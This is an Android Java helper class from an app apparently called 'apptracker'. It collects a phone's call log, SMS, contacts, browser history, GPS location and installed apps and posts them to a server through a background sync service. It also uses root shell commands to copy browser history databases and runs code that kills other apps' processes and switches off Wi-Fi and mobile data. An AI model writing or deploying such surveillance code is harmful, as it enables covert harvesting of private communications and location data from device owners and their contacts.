package com.frostweepgames.apptracker;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ActivityManager;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;

import static android.content.Context.ACTIVITY_SERVICE;
import static android.support.v4.app.ActivityCompat.requestPermissions;
import static android.support.v4.app.ActivityCompat.shouldShowRequestPermissionRationale;

import android.support.v4.app.ActivityCompat;
import android.telephony.CellInfo;
import android.telephony.CellInfoGsm;
import android.telephony.CellInfoWcdma;
import android.telephony.CellSignalStrength;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import com.frostweepgames.apptracker.managers.SQLiteManager;
import com.frostweepgames.apptracker.managers.SystemControllersManager;
import com.frostweepgames.apptracker.models.GPSModel;
import com.frostweepgames.apptracker.models.SystemInfoModel;
import com.frostweepgames.apptracker.managers.NetworkManager;
import com.frostweepgames.apptracker.settings.Constants;
import com.frostweepgames.apptracker.settings.Enumerators;
import com.frostweepgames.apptracker.syncservice.SyncBackgroundService;
import com.google.gson.Gson;
import com.stericson.RootShell.exceptions.RootDeniedException;
import com.stericson.RootShell.execution.Command;
import com.stericson.RootTools.RootTools;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.text.Format;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.TimeoutException;

/**-------------------------------
 * Created by artem on 21.02.2018.
 * Powered by Frostweep Games
 * All rights reserved!
 * (c)2013-2018
 * www.frostweepgames.com
 ---------------------------------*/

public class Helper {

    //SYSTEM TOOLS

    public static boolean mayRequestPermission(Activity activity, String permission, int permissionValue) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            return true;
        }
        if (ActivityCompat.checkSelfPermission(activity, permission) == PackageManager.PERMISSION_GRANTED) {
            return true;
        }
        if (shouldShowRequestPermissionRationale(activity, permission)) {
            requestPermissions(activity, new String[]{permission}, permissionValue);
        } else {
            requestPermissions(activity, new String[]{permission}, permissionValue);
        }
        return false;
    }

    public static Long getTimestampFromDate(Date date) {
        return date.getTime() / 1000;
    }

    public static Date getDateFromTimestamp(Long milliseconds) {
        return new Date(milliseconds);
    }

    public static void drawSystemMessageTooltip(Context context, String message) {
        Toast toast = Toast.makeText(context, message, Toast.LENGTH_LONG);
        toast.show();
    }

    public static Date getCurrentDate() {
        return getDateFromTimestamp(System.currentTimeMillis());
    }

    public static SystemInfoModel getSystemInfo(Context context, boolean useService) {
        SystemInfoModel systemInfo = new SystemInfoModel();

        systemInfo.power = Integer.toString(getBatteryPercentage(context));
        systemInfo.level_gps = getLevelGPS(context, useService);
        systemInfo.level_gsm = getLevelGSM(context);
        systemInfo.version_os = android.os.Build.VERSION.RELEASE;
        systemInfo.ram = Long.toString(getRAMValue(context));
        systemInfo.rooted = isDeviceRooted();
        systemInfo.tm = getTimestampFromDate(getCurrentDate());

        return systemInfo;
    }

    public static int getBatteryPercentage(Context context) {

        IntentFilter iFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = context.registerReceiver(null, iFilter);

        int level = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
        int scale = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1) : -1;

        float batteryPct = level / (float) scale;

        return (int) (batteryPct * 100);
    }

    public static long getRAMValue(Context context) {
        ActivityManager.MemoryInfo mi = new ActivityManager.MemoryInfo();
        ActivityManager activityManager = (ActivityManager) context.getSystemService(ACTIVITY_SERVICE);
        activityManager.getMemoryInfo(mi);

        return mi.totalMem / 0x100000L;
    }

    public static String getLevelGPS(Context context, boolean useService) {
        String gpsLevel = "0.0";

        ArrayList<GPSModel> gpsModels = (ArrayList<GPSModel>)GetSystemControllersManager(useService).GetController(Enumerators.ControllerType.GPS).getContent();

        if (gpsModels != null && gpsModels.size() > 0)
            gpsLevel = gpsModels.get(gpsModels.size() - 1).accuracy;

        return gpsLevel;
    }

    @SuppressLint("MissingPermission")
    public static String getLevelGSM(Context context) {
        String gsmLevel = "-1";

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN_MR1) {

            if (MainActivity.SelfActivity() != null) {
                if (!mayRequestPermission(MainActivity.SelfActivity(), Manifest.permission.ACCESS_COARSE_LOCATION, Constants.REQUEST_PERMISSION_VALUE))
                    return gsmLevel;
            }

            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

            List<CellInfo> cells = telephonyManager.getAllCellInfo();

            if(cells != null) {
                for (int i = 0; i < cells.size(); i++) {
                    CellInfo cellinfogsm = telephonyManager.getAllCellInfo().get(i);

                    int asu = 99;
                    if (CellInfoGsm.class == cellinfogsm.getClass()) {
                        CellSignalStrength strength = ((CellInfoGsm) cellinfogsm).getCellSignalStrength();
                        asu = strength.getAsuLevel();
                    } else {
                        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2 && CellInfoWcdma.class == cellinfogsm.getClass()) {
                            CellSignalStrength strength = ((CellInfoWcdma) cellinfogsm).getCellSignalStrength();
                            asu = strength.getAsuLevel();
                        } else {
                            Log.d("TYPE", cellinfogsm.getClass().toString());
                        }

                    }

                    // ASU ranges from 0 to 31 - TS 27.007 Sec 8.5
                    // asu = 0 (-113dB or less) is very weak
                    // signal, its better to show 0 bars to the user in such cases.
                    // asu = 99 is a special case, where the signal strength is unknown.
                    if (asu <= 2 || asu == 99) gsmLevel = "0";
                    else if (asu >= 12) gsmLevel = "4";
                    else if (asu >= 8) gsmLevel = "3";
                    else if (asu >= 5) gsmLevel = "2";
                    else gsmLevel = "1";
                }
            }
        }

        return gsmLevel;
    }

    public static boolean isWiFiNetworkAvailable(Context context) {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();

        if (activeNetworkInfo != null) {
            if (activeNetworkInfo.getType() == ConnectivityManager.TYPE_WIFI)
                return activeNetworkInfo.isConnected();
        }

        return false;
    }

    public static boolean isGPRSNetworkAvailable(Context context) {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();

        if (activeNetworkInfo != null) {
            if (activeNetworkInfo.getType() == ConnectivityManager.TYPE_MOBILE)
                return activeNetworkInfo.isConnected();
        }

        return false;
    }

    public static boolean isDeviceRooted() {
        if (isRootAvailable()) {
            Process process = null;
            try {
                process = Runtime.getRuntime().exec(new String[]{"su", "-c", "id"});
                BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String output = in.readLine();
                if (output != null && output.toLowerCase().contains("uid=0"))
                    return true;
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                if (process != null)
                    process.destroy();
            }
        }

        return false;
    }

    private static boolean isRootAvailable() {
        for (String pathDir : System.getenv("PATH").split(":")) {
            if (new File(pathDir, "su").exists()) {
                return true;
            }
        }
        return false;
    }

    public static void deleteFile(String pathToFile) {
        try {
            boolean delete = new File(pathToFile).delete();
        } catch (Exception e) {
            Log.d("tag", e.getMessage());
        }
    }

    public static String getFileNameThatEndsBy(String folder, String where) {
        String foundName = where;

        if (isDeviceRooted()) {
            RootTools.copyFile(folder, Constants.DEFAULT_HISTORY_FOLDER_DB_PATH, false, false);

            File file = new File(Constants.DEFAULT_HISTORY_FOLDER_DB_PATH);

            for (File localFile : file.listFiles()) {
                if (localFile.getName().endsWith(where)) {
                    foundName = localFile.getName();
                    break;
                }
            }

            deleteFile(Constants.DEFAULT_HISTORY_FOLDER_DB_PATH);
        }

        return foundName;
    }

    public static boolean isSystemApp(Context context, String packageName) {
        try {

            final PackageManager pm = context.getPackageManager();
            // Get packageinfo for target application
            PackageInfo targetPkgInfo = pm.getPackageInfo(
                    packageName, PackageManager.GET_SIGNATURES);
            // Get packageinfo for system package
            PackageInfo sys = pm.getPackageInfo(
                    "android", PackageManager.GET_SIGNATURES);
            // Match both packageinfo for there signatures
            return (targetPkgInfo != null && targetPkgInfo.signatures != null && sys.signatures[0]
                    .equals(targetPkgInfo.signatures[0]));
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    public static boolean isAppPreLoaded(Context context, ApplicationInfo ai) {
        try {
            final PackageManager pm = context.getPackageManager();

            if (ai != null && (ai.flags & (ApplicationInfo.FLAG_SYSTEM | ApplicationInfo.FLAG_UPDATED_SYSTEM_APP)) != 0) {
                return isSystemApp(context, ai.packageName);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    public static void killProccesses(Context context, List<String> killPackages, boolean useRootTools) {
        if (useRootTools) {
            if (isRootAvailable()) {
                try {
                    for (String pckg : killPackages) {
                        RootTools.killProcess(pckg);
                    }
                } catch (Exception ignored) {
                }
            }
        } else {
            try {
                ActivityManager manager = (ActivityManager) context.getSystemService(ACTIVITY_SERVICE);
                List<ActivityManager.RunningAppProcessInfo> appProccesses = manager.getRunningAppProcesses();

                for (ActivityManager.RunningAppProcessInfo process : appProccesses) {
                    for (String pckg : killPackages) {
                        if (process.processName.contains(pckg)) {
                            android.os.Process.sendSignal(process.pid, android.os.Process.SIGNAL_KILL);
                            android.os.Process.killProcess(process.pid);
                            manager.killBackgroundProcesses(pckg);
                        }
                    }
                }
            }
            catch (Exception ex){}
        }
    }

    public static SystemControllersManager GetSystemControllersManager(boolean useService) {
        SystemControllersManager systemControllersManager;
        if (!useService) {
            systemControllersManager = MainActivity.systemControllersManager;
        } else {
            systemControllersManager = SyncBackgroundService.systemControllersManager;
        }

        return systemControllersManager;
    }

    public static String convertControllerToString(Enumerators.ControllerType controllerType)
    {
        switch (controllerType)
        {
            case INSTALLED_APPS: return "app";
            case BROWSER_HISTORY: return "browser";
            case CALLS: return "call";
            case CONTACTS: return "contacts";
            case GPS: return "gps";
            case SYSTEM: return "system";
            case SMS: return "sms";
            case MOBILE_INFO: return "mobile_info";

            default: return "";
        }
    }

    public static boolean isTimeBetween(Date currentTime, String startTime, String endTime)
    {
        try {

            Date start = new SimpleDateFormat("HH:mm", Locale.getDefault()).parse(startTime);
            Calendar calendar1 = Calendar.getInstance();
            calendar1.setTime(start);

            Date end = new SimpleDateFormat("HH:mm", Locale.getDefault()).parse(endTime);
            Calendar calendar2 = Calendar.getInstance();
            calendar2.setTime(end);

            Format formatter = new SimpleDateFormat("HH:mm", Locale.getDefault());
            String current = formatter.format(currentTime);
            Date currentDate = new SimpleDateFormat("HH:mm", Locale.getDefault()).parse(current);
            Calendar calendar3 = Calendar.getInstance();
            calendar3.setTime(currentDate);

            if(getTimestampFromDate(calendar3.getTime()) < getTimestampFromDate(calendar2.getTime()) &&
               getTimestampFromDate(calendar3.getTime()) > getTimestampFromDate(calendar1.getTime()))
                return true;

        } catch (ParseException e) {
            e.printStackTrace();
        }

        return false;
    }

    // SERIALIZATION

    public static String serializeObject(Object object) {
        try {
            return new Gson().toJson(object);
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    public static <T> T deserializeString(String string, Class<T> type) {
        return (T) (new Gson().fromJson(string, type));
    }


    // SERVICE MANAGEMENT

    public static boolean isServiceRunning(Class<?> serviceClass, Context context) {

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            ActivityManager manager = (ActivityManager) context.getSystemService(ACTIVITY_SERVICE);
            for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
                if (serviceClass.getName().equals(service.service.getClassName())) {
                    return true;
                }
            }
        }

        return false;
    }


    // API SYNC

    public static ContentValues prepareContentValuesFromList(HashMap<String, Object> content) {
        ContentValues contentValues = new ContentValues();

        String value;
        Object val;
        for (Map.Entry<String, Object> entry : content.entrySet()) {
            val = entry.getValue();

            if (val.getClass() != String.class)
                value = serializeObject(val);
            else
                value = (String) val;

            contentValues.put(entry.getKey(), value);
        }
        return contentValues;
    }

    public static HashMap<String, Object> getDataFromController(Context context, Enumerators.ControllerType type, boolean sysInfo, boolean useService) {
        HashMap<String, Object> map = new HashMap<>();

        if (!sysInfo)
            map.put(Constants.SERVER_KEY_DATA, GetSystemControllersManager(useService).GetController(type).getContent());
        else
            map.put(Constants.SERVER_KEY_DATA, Helper.getSystemInfo(context, useService));

        return map;
    }

    public static String getDataFromController(Context context, Enumerators.ControllerType type, boolean sysInfo) {
        if (!sysInfo) {
            return serializeObject(GetSystemControllersManager(true).GetController(type).getContent());
        }
        else
            return serializeObject(getSystemInfo(context, true));
    }

    public static void syncAllInfoData(Context context, boolean useService) {
        NetworkManager networkManager;

        if (!useService) {
            networkManager = MainActivity.networkManager;
        } else {
            networkManager = SyncBackgroundService.networkManager;
        }

        networkManager.sendPOSTRequest(Enumerators.APINetRequestType.UPDATE_CALLS, Enumerators.NetworkRequestType.POST, getDataFromController(context, Enumerators.ControllerType.CALLS, false, useService));
        networkManager.sendPOSTRequest(Enumerators.APINetRequestType.UPDATE_INSTALLED_APPS, Enumerators.NetworkRequestType.POST, getDataFromController(context, Enumerators.ControllerType.INSTALLED_APPS, false, useService));
        networkManager.sendPOSTRequest(Enumerators.APINetRequestType.UPDATE_BROWSER_HISTORY, Enumerators.NetworkRequestType.POST, getDataFromController(context, Enumerators.ControllerType.BROWSER_HISTORY, false, useService));
        networkManager.sendPOSTRequest(Enumerators.APINetRequestType.UPDATE_SMS, Enumerators.NetworkRequestType.POST, getDataFromController(context, Enumerators.ControllerType.SMS, false, useService));
        networkManager.sendPOSTRequest(Enumerators.APINetRequestType.UPDATE_GPS, Enumerators.NetworkRequestType.POST, getDataFromController(context, Enumerators.ControllerType.GPS, false, useService));
        networkManager.sendPOSTRequest(Enumerators.APINetRequestType.UPDATE_CONTACTS, Enumerators.NetworkRequestType.POST, getDataFromController(context, Enumerators.ControllerType.CONTACTS, false, useService));
        networkManager.sendPOSTRequest(Enumerators.APINetRequestType.SEND_SYSTEM, Enumerators.NetworkRequestType.POST, getDataFromController(context, Enumerators.ControllerType.SYSTEM, true, useService));
    }

    public static void syncDataFromDB(Enumerators.APINetRequestType requestType, String table, boolean useService) {
        NetworkManager networkManager;
        SQLiteManager sqliteManager;

        if (!useService) {
            networkManager = MainActivity.networkManager;
            sqliteManager = MainActivity.sqliteManager;
        } else {
            networkManager = SyncBackgroundService.networkManager;
            sqliteManager = SyncBackgroundService.sqliteManager;
        }

        ArrayList<SQLiteManager.SQLiteLineModel> list = sqliteManager.getObjectsFromDB(table, null, null, null);
        HashMap<String, Object> map = new HashMap<>();

        for (SQLiteManager.SQLiteLineModel entry : list) {

            if(requestType == Enumerators.APINetRequestType.SEND_SYSTEM)
                map.put(Constants.SERVER_KEY_DATA, deserializeString(entry.Data, SystemInfoModel.class));
            else
                map.put(Constants.SERVER_KEY_DATA, deserializeString(entry.Data, ArrayList.class));

            networkManager.sendPOSTRequest(requestType, Enumerators.NetworkRequestType.POST, map);
            map.clear();
        }

        sqliteManager.removeElementInDB(table, 0, true);
    }


    // NETWORKING API

    public static void disableWiFi(Context context) {
        if (MainActivity.SelfActivity() != null) {
            if (!mayRequestPermission(MainActivity.SelfActivity(), android.Manifest.permission.ACCESS_WIFI_STATE, Constants.REQUEST_PERMISSION_VALUE))
                return;

            if (!mayRequestPermission(MainActivity.SelfActivity(), android.Manifest.permission.CHANGE_WIFI_STATE, Constants.REQUEST_PERMISSION_VALUE))
                return;
        }

        if(!isWiFiNetworkAvailable(context))
            return;

        WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
        wifiManager.setWifiEnabled(false);
    }

    public static void disableGPRS(Context context) {

        if(!isGPRSNetworkAvailable(context))
            return;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {

            if (isDeviceRooted()) {
                Command command = new Command(0, "svc data disable");

                try {
                    RootTools.getShell(true).add(command);

                } catch (IOException e) {
                    e.printStackTrace();
                } catch (TimeoutException e) {
                    e.printStackTrace();
                } catch (RootDeniedException e) {
                    e.printStackTrace();
                }
            }

        } else {

            try {
                final ConnectivityManager conman = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
                final Class<?> conmanClass = Class.forName(conman.getClass().getName());
                final Field iConnectivityManagerField = conmanClass.getDeclaredField("mService");
                iConnectivityManagerField.setAccessible(true);
                final Object iConnectivityManager = iConnectivityManagerField.get(conman);
                final Class<?> iConnectivityManagerClass = Class.forName(iConnectivityManager.getClass().getName());
                final Method setMobileDataEnabledMethod = iConnectivityManagerClass.getDeclaredMethod("setMobileDataEnabled", Boolean.TYPE);
                setMobileDataEnabledMethod.setAccessible(true);
                setMobileDataEnabledMethod.invoke(iConnectivityManager, false);
            } catch (Exception e) {

                Log.d("exception", e.getMessage());
            }
        }
    }
}